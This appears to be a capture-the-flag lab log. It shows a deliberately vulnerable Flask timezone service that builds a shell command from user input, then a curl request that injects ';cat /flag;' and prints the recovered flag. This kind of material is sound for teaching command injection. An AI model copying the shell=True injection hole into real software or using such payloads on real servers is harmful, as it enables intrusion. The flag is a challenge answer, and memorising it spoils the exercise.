@@ -1,0 +1,54 @@
+hacker@web-security~cmdi-4:~$ cat /challenge/server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/step", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("timezone-value", "MST")
+    command = f"TZ={arg} date"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the timezone service! Please choose a timezone to get the time there.
+        <form action="/step"><input type=text name=timezone-value><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+
+        hacker@web-security~cmdi-4:/challenge$ curl "http://challenge.localhost:80/step?timezone-value=/;cat%20/flag;"
+DEBUG: command='TZ=/;cat /flag; date'
+127.0.0.1 - - [19/Oct/2025 17:24:37] "GET /step?timezone-value=/;cat%20/flag; HTTP/1.1" 200 -
+
+        <html><body>
+        Welcome to the timezone service! Please choose a timezone to get the time there.
+        <form action="/step"><input type=text name=timezone-value><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of TZ=/;cat /flag; date:</b><br>
+        <pre>pwn.college{kAd6zRijQ7bejmHCbnWaUbGGjeY.dhDOzMDL1AjM5MzW}
+Sun Oct 19 17:24:37 UTC 2025
+</pre>
+        </body></html>
